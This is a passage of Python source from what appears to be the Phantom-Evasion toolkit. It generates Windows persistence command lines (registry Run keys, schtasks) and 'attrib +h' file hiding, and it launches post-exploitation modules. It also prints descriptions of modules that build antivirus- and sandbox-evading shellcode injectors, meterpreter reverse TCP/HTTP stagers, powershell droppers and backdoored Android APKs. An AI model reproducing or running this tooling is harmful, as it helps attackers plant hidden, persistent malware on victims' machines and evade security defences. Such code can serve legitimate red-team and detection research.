        Req = bcolors.GREEN + "Not Required"  + bcolors.ENDC

        AddPersistenceCmd = "reg add \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" /V \"" + RegValue + "\" /t REG_SZ /F /D \"" + FullPath + "\""

        RemovePersistenceCmd = "reg delete \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" /V \"" + RegValue + "\" /f" 
    sleep(0.2)
    print(bcolors.GREEN + "\n[>] Generating cmdline...\n" + bcolors.ENDC)
    sleep(1)

    clear()
    print("\n" + bcolors.OCRA + bcolors.BOLD + "[>] Admin Priv: " + bcolors.ENDC + bcolors.ENDC + Req)
    print("\n" + bcolors.OCRA + bcolors.BOLD + "[>] Add Persistence Cmdline: " + bcolors.ENDC + bcolors.ENDC + AddPersistenceCmd)
    print("\n" + bcolors.OCRA + bcolors.BOLD + "[>] Remove Persistence Cmdline: " + bcolors.ENDC + bcolors.ENDC + RemovePersistenceCmd)
    Enter2Continue()


def Windows_Schtasks_Persistence():
    clear()
    py_version=platform.python_version()
    print(bcolors.GREEN + "\n[>] Schtasks mode\n" + bcolors.ENDC)
    print("[1] At Startup     (start on user login)")
    print("[2] Daily time     (start once at day)")
    print("[3] User Idle time (start if user is idle for x time)")


    PersistenceType = InputFunc("\n[>] Insert schtasks mode : ")
    FullPath = InputFunc("\n[>] Insert fullpath to file or script to schedule: ")
    Taskname = InputFunc("\n[>] Insert taskname (Enter for random generation): ")

    if Taskname == "":
        Taskname = ""
        Taskname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(random.randint(8,18)))


    if PersistenceType == "1":

        UseDelay = YesOrNo(InputFunc("\n[>] Insert execution delay after userlogin? (y/n): "))

        if UseDelay == "True":

            print("\n[Help] hhmm:ss format")
            print("\n[Example] a minute and half of delay = 0001:30")

            TimeVar = InputFunc("\n[>] Insert delay value: ")

            sleep(0.01)

            while len(TimeVar) < 7:

                print(bcolors.RED + "\n [-] Invalid time format" + bcolors.ENDC)
                print("\n[Help] hhmm:ss format")
                print("\n[Example] a minute and half of delay = 0001:30")
                TimeVar = InputFunc("\n[>] Insert delay value: ")
        else:
            TimeVar = "No"        

    elif PersistenceType == "2":
   
        print("\n [Help] hhmm:ss format,")
        print("\n [Example] schedule for half past midnight = 0030:00")

        TimeVar = InputFunc("\n[>] Insert daytime for scheduled execution: ")

        while len(TimeVar) < 7:

            print(bcolors.RED + "\n [-] Invalid time format" + bcolors.ENDC)
            print("\n [Help] hhmm:ss format,")
            print("\n [Example] schedule for half past midnight = 0030:00")
            TimeVar = InputFunc("\n[>] Insert daytime for scheduled execution: ")                      
               
    elif PersistenceType == "3":
   
        print("\n [Help] hhmm:ss Timeformat,")
        print("\n [Example:] execute after user has been idle a minute and half = 0001:30")
 
        TimeVar = InputFunc("\n [>] Insert idletime value: ")
 
        while len(TimeVar) < 7:

            print(bcolors.RED + "\n [-] Invalid time format" + bcolors.ENDC)
            print("\n [Help] hhmm:ss Timeformat,")
            print("\n [Example] execute after user has been idle a minute and half = 0001:30")

            TimeVar = InputFunc("\n[>] Insert idletime value: ")
  
    sleep(0.2)
    print(bcolors.GREEN + "\n[>] Generating Persistence Cmdline...\n" + bcolors.ENDC)
    sleep(1)
    clear()

    if platform.system() == "Linux":

        subprocess.call(['python','Modules/post-exploitation/Windows_CMD_Persistence_Schtasks.py',FullPath,Taskname,PersistenceType,TimeVar])


    elif platform.system() == "Windows":

        subprocess.call(['py','Modules/post-exploitation/Windows_CMD_Persistence_Schtasks.py',FullPath,Taskname,PersistenceType,TimeVar])


def Attrib_CMD():
    clear()

    Fullpath=InputFunc("\n[>] Insert fullpath to file: ")

    cmdline="attrib +h " + Fullpath
    clear()
    print("\n" + bcolors.OCRA + bcolors.BOLD + "[>] Cmdline: " + bcolors.ENDC + bcolors.ENDC + cmdline)
    Enter2Continue()


def Windows_C_HiddenFiles():
    clear()

    CompileFor=InputFunc("\n[>] Insert compiler option (x86 or x64): ")
    OutFile=InputFunc("\n[>] Insert output filename: ")

    sleep(0.5)
    print(bcolors.GREEN + "\n[>] Generating C code...\n" + bcolors.ENDC)

    if platform.system() == "Linux":

        subprocess.call(['python','Modules/post-exploitation/Windows_C_SetFilesAttributeHidden.py'])


    elif platform.system() == "Windows":

        subprocess.call(['py','Modules/post-exploitation/Windows_C_SetFilesAttributeHidden.py'])

    sleep(1)

    print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)

    auto_compiler("windows",CompileFor,OutFile)

    print("\n[<>] File saved in Phantom-Evasion folder\n")
    Enter2Continue()

def SelectHideMode():
    clear()
    py_version=platform.python_version()
    print(bcolors.GREEN + "\n[>] Cmdline or Compiled executable\n" + bcolors.ENDC)
    print("[1] Cmdline                                 (attrib)")
    print("[2] Compiled Executable      (SetFilesAttribute API)")
    print("[0] Main Menu\n")

    Mode = InputFunc("\n[>] Select mode : ")

    if Mode == "1":

        Attrib_CMD()

    elif Mode == "2":

        Windows_C_HiddenFiles()

    elif Mode == "0":

        Sleep(0.2)

    else:
        print("[-] Invalid Option")
        Enter2Continue()
        SelectHideMode()
        return None

def YesOrNo(Answerme):
    if (Answerme == "y") or (Answerme == "Y") or (Answerme == "yes") or (Answerme == "Yes"):
        return "True"
    else:
        return "False" 

def description_printer(module_type):
    print("\n[+] MODULE DESCRIPTION:\n") 
    

    if module_type == "Polymorphic_MVA_mathinject_windows.py":
        description = ""
        description += "  This module generate and compile\n"
        description += "  Windows executable written in c capable to \n"
        description += "  inject and execute shellcode in memory (virtual) using \n"
        description += "  VirtualAlloc API. \n\n"
        description += "  [>] Memory allocation type: VIRTUAL\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  32bit ENCODER avaiable: \n"
        description += "  [1] x86/shikata_ga_nai\n"
        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
        description += "  64bit ENCODER avaiable: \n"
        description += "  [1] x64/xor\n"
        description += "  [2] x64/xor + Multibyte xor\n"
        description += "  [3] x64/xor + Double-key multibyte xor\n"
        description += "  [4] x64/xor + Triple-key multibyte xor\n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Resource consumption technique\n"
        description += "  Sandbox-aware code \n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"

    elif module_type == "Polymorphic_MHA_mathinject_windows.py":
        description = ""
        description += "  This module generate and compile\n"
        description += "  Windows executable written in c capable to \n"
        description += "  inject and execute shellcode in memory (heap) using \n"
        description += "  HeapAlloc and HeapCreate API. \n\n"
        description += "  [>] Memory allocation type: HEAP\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  32bit ENCODER avaiable: \n"
        description += "  [1] x86/shikata_ga_nai\n"
        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
        description += "  64bit ENCODER avaiable: \n"
        description += "  [1] x64/xor\n"
        description += "  [2] x64/xor + Multibyte xor\n"
        description += "  [3] x64/xor + Double-key multibyte xor\n"
        description += "  [4] x64/xor + Triple-key multibyte xor\n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Resource consumption technique\n"
        description += "  Sandbox-aware code \n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"

    elif module_type == "Polymorphic_MVA_NDC_LLGPA_mathinject_windows.py":
        description = ""
        description += "  This module behave like Polymorphic MultipathVirtualAlloc but\n"
        description += "  it use LoadLibrary() and GetProcAddress() to load at runtime VirtualAlloc \n"
        description += "  without direct call\n\n"
        description += "  [>] Memory allocation type: VIRTUAL\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  32bit ENCODER avaiable: \n"
        description += "  [1] x86/shikata_ga_nai\n"
        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
        description += "  64bit ENCODER avaiable: \n"
        description += "  [1] x64/xor\n"
        description += "  [2] x64/xor + Multibyte xor\n"
        description += "  [3] x64/xor + Double-key multibyte xor\n"
        description += "  [4] x64/xor + Triple-key multibyte xor\n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Resource consumption technique\n"
        description += "  Sandbox-aware code \n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"

    elif module_type == "Polymorphic_MVA_NDC_GPAGMH_mathinject_windows.py":
        description = ""
        description += "  This module behave like Polymorphic MultipathVirtualAlloc but\n"
        description += "  it use GetProcAddress() and GetMonduleHandle() to load at runtime VirtualAlloc \n"
        description += "  without direct call\n\n"
        description += "  [>] Memory allocation type: VIRTUAL\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  32bit ENCODER avaiable: \n"
        description += "  [1] x86/shikata_ga_nai\n"
        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
        description += "  64bit ENCODER avaiable: \n"
        description += "  [1] x64/xor\n"
        description += "  [2] x64/xor + Multibyte xor\n"
        description += "  [3] x64/xor + Double-key multibyte xor\n"
        description += "  [4] x64/xor + Triple-key multibyte xor\n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Resource consumption technique\n"
        description += "  Sandbox-aware code \n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"

    elif module_type == "Polymorphic_MHA_NDC_LLGPA_mathinject_windows.py":
        description = ""
        description += "  This module behave like Shellcode Injection HeapAlloc but\n"
        description += "  it use LoadLibrary() and GetProcAddress() to load at runtime HeapCreate and \n"
        description += "  HeapAlloc without direct call\n\n"
        description += "  [>] Memory allocation type: HEAP\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  32bit ENCODER avaiable: \n"
        description += "  [1] x86/shikata_ga_nai\n"
        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
        description += "  64bit ENCODER avaiable: \n"
        description += "  [1] x64/xor\n"
        description += "  [2] x64/xor + Multibyte xor\n"
        description += "  [3] x64/xor + Double-key multibyte xor\n"
        description += "  [4] x64/xor + Triple-key multibyte xor\n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Resource consumption technique\n"
        description += "  Sandbox-aware code \n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"


    elif module_type == "Polymorphic_MHA_NDC_GPAGMH_mathinject_windows.py":
        description = ""
        description += "  This module behave like Shellcode Injection HeapAlloc but\n"
        description += "  it use GetProcAddress() and GetMonduleHandle() to load at runtime HeapCreate and \n"
        description += "  HeapAlloc without direct call\n\n"
        description += "  [>] Memory allocation type: HEAP\n\n"
        description += "  32bit ENCODER avaiable: \n"
        description += "  [1] x86/shikata_ga_nai\n"
        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
        description += "  64bit ENCODER avaiable: \n"
        description += "  [1] x64/xor\n"
        description += "  [2] x64/xor + Multibyte xor\n"
        description += "  [3] x64/xor + Double-key multibyte xor\n"
        description += "  [4] x64/xor + Triple-key multibyte xor\n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Resource consumption technique\n"
        description += "  Sandbox-aware code \n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"

    elif module_type == "Polymorphic_PowershellOnelineDropper_windows.py":
        description = ""
        description += "  This module generate and compile\n"
        description += "  Windows powershell/cmd oneliner dropper written in c\n"
        description += "  [>] METHOD: system() call\n"
        description += "  [>] Payload type: Oneliner powershell payload\n\n"
        description += "  [>] Require powershell installed (target-side) \n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"

    elif module_type == "Polymorphic_PowershellScriptDropper_windows.py":
        description = ""
        description += "  This module generate and compile\n"
        description += "  Windows executable written in c capable to\n"
        description += "  execute a custom .ps1 file stored inside the executable \n\n"
        description += "  [>] METHOD: create hidden .ps1 file & system() call\n"
        description += "  [>] Payload type: Powershell Script payload\n\n"
        description += "  [>] Require powershell installed (target-side) \n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
        description += "  [>] WARNING: 32 bit msfvenom powershell payloads will not\n"
        description += "  work against 64 bit targets (like other modules) be sure to use\n"
        description += "  64 bit payloads in that case\n"

    elif module_type == "Polymorphic_MHA_mathinject_linux.py":
        description = ""
        description += "  This module generate and compile\n"
        description += "  Linux executable written in c capable to \n"
        description += "  inject and execute shellcode in memory (heap) \n\n"
        description += "  [>] Memory allocation type: HEAP\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  32bit ENCODER avaiable: \n"
        description += "  [1] x86/shikata_ga_nai\n"
        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
        description += "  64bit ENCODER avaiable: \n"
        description += "  [1] x64/xor\n"
        description += "  [2] x64/xor + Multibyte xor\n"
        description += "  [3] x64/xor + Double-key multibyte xor\n"
        description += "  [4] x64/xor + Triple-key multibyte xor\n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Resource consumption technique\n"
        description += "  Sandbox-aware code \n"
        description += "  [>] AUTOCOMPILE(cross platform): to ELF file \n"

    elif module_type == "Pytherpreter":

        description = ""
        description += "  This Module use python metasploit payloads to forge\n"
        description += "  executable (for the platform that launch this module) able to \n"
        description += "  avoid payload's execution inside most AV sandbox \n\n"
        description += "  [>] Memory allocation type: managed by python interpreter\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  Base 64 Encoded \n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Random millions increments  \n"
        description += "  [>] AUTOCOMPILE: using Pyinstaller \n"

    elif module_type == "Pytherpreter_Polymorphic":

        description = ""
        description += "  This Module use python metasploit payloads to forge\n"
        description += "  executable able to \n"
        description += "  avoid payload's execution inside most AV sandbox \n\n"
        description += "  [>] Memory allocation type: managed by python interpreter\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  Base 64 Encoded \n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Random millions increments  \n"
        description += "  Am i Zero?  \n"
        description += "  crazy pow   \n"
        description += "  [>] AUTOCOMPILE: using Pyinstaller \n"

    elif module_type == "Pytherpreter_Polymorphic_Powershelloneline":

        description = ""
        description += "  This Module use pyinstaller to forge\n"
        description += "  executable able to \n"
        description += "  drop commandline payload using os.system() \n\n"
        description += "  [>] Memory allocation type: managed by python interpreter\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  Base 64 Encoded \n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Random millions increments  \n"
        description += "  Am i Zero?  \n"
        description += "  crazy pow   \n"
        description += "  [>] AUTOCOMPILE: using Pyinstaller \n"


    elif module_type == "Osx_Cascade_Encoding":

        description = ""
        description += "  This Module use osx x64 metasploit payloads to create\n"
        description += "  multi encoded payload in mach-o format \n"
        description += "  [>] Memory allocation type: metasploit\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  Multi-Encoded (pure metasploit) \n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  None  \n"
        description += "  [>] OUTFORMAT: dmg \n"



    elif module_type == "Smali_Droidmare":

        description = ""
        description += "  This Module baksmali msfvenom apk payloads\n"
        description += "  with apktool, modifies smali code, \n"
        description += "  rebuild and resign the new apk  \n\n"
        description += "  [>] Support existing apk backdooring\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  Nop injection \n"
        description += "  string & path renaming \n"
        description += "  permissions shuffler \n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  counters injection in method\n"
        description += "  [>] OUTFORMAT: Apk \n"

    elif module_type == "Polymorphic_BashOnelinerDropper_mathinject_linux.py":
        description = ""
        description += "  This Module generate and compile \n"
        description += "  Linux oneline payload dropper written in c \n"
        description += "  [>] METHOD: system() call\n"
        description += "  [>] Payload type: Oneliner payload\n\n"

    elif module_type == "Polymorphic_C_x86ReverseTcpMeterpreter_windows.py":

        description = ""
        description += "  This Module generate and compile\n"
        description += "  32bit pure c meterpreter reverse tcp stagers. \n"
        description += "  Require msfconsole multi/handler listener\n"
        description += "  with payload set to windows/meterpreter/reverse_tcp\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  Polymorphic source code \n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Resource consumption technique\n"
        description += "  Sandbox-aware code \n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"


    elif module_type == "Polymorphic_C_x86ReverseHttpMeterpreter_windows.py":

        description = ""
        description += "  This Module generate and compile\n"
        description += "  32bit pure c meterpreter reverse http stagers. \n"
        description += "  Require msfconsole multi/handler listener\n"
        description += "  with payload set to windows/meterpreter/reverse_http\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  Polymorphic source code \n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Resource consumption technique\n"
        description += "  Sandbox-aware code \n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"

    elif module_type == "Polymorphic_C_x64ReverseTcpMeterpreter_windows.py":

        description = ""
        description += "  This Module generate and compile\n"
        description += "  64bit pure c meterpreter reverse tcp stagers. \n"
        description += "  Require msfconsole multi/handler listener\n"
        description += "  with payload set to windows/meterpreter/reverse_tcp\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  Polymorphic source code \n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Resource consumption technique\n"
        description += "  Sandbox-aware code \n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"


    elif module_type == "Polymorphic_C_x64ReverseHttpMeterpreter_windows.py":

        description = ""
        description += "  This Module generate and compile\n"
        description += "  64bit pure c meterpreter reverse http stagers. \n"
        description += "  Require msfconsole multi/handler listener\n"
        description += "  with payload set to windows/meterpreter/reverse_http\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  Polymorphic source code \n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Resource consumption technique\n"
        description += "  Sandbox-aware code \n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"

    # POST-EXPLOITATION

    elif module_type == "Windows_C_Persistence_Startup.py":

        description = ""
        description += "  This module generate and compile\n"
        description += "  persistence executables that accept a given path to file \n"
        description += "  and use RegCreateKeyExW to add key to register\n\n"
        description += "  [>] PERSISTENCE TYPE:\n"
        description += "  At user login\n"   
        description += "  [>] PERSISTENCE PRIVILEGE:\n"
        description += "  Userland/Admin\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  Polymorphic source code \n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Resource consumption technique\n"
        description += "  Sandbox-aware code \n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"


    elif module_type == "Windows_CMD_Persistence_REG":

        description = ""
        description += "  This Module generate \n"
        description += "  persistence cmdline oneliners \n"
        description += "  which uses reg to add key to register\n\n"
        description += "  [>] PERSISTENCE TYPE:\n"
        description += "  At user login\n"   
        description += "  [>] PERSISTENCE PRIVILEGE:\n"
        description += "  Userland\n"

    elif module_type == "Windows_C_Persistence_TimeBased.py":

        description = ""
        description += "  This module generate and compile\n"
        description += "  executables that periodically check  \n"
        description += "  if the specified process is alive otherwise WinExec API will be used\n"
        description += "  to launch a specified file\n"
        description += "  [>] PERSISTENCE TYPE:\n"
        description += "  time based \n"
        description += "  (need to be combined with a startup persistence module)\n"   
        description += "  [>] PERSISTENCE PRIVILEGE:\n"
        description += "  Userland/Admin\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  Polymorphic source code \n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Resource consumption technique\n"
        description += "  Sandbox-aware code \n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"


    elif module_type == "Windows_CMD_Persistence_Schtasks.py":

        description = ""
        description += "  This module generate \n"
        description += "  persistence cmdline oneliners \n"
        description += "  schtasks is used to schedule task \n\n"
        description += "  [>] PERSISTENCE TYPE:\n"
        description += "  At user login\n" 
        description += "  At daily time\n" 
        description += "  if user has been idle for x seconds\n"  
        description += "  [>] PERSISTENCE PRIVILEGE:\n"
        description += "  Admin\n"



    else: 
        description = "None"
    print(description)
    try:   
        ans=input("  Press Enter to continue: ") 
    except SyntaxError:
        pass

    pass
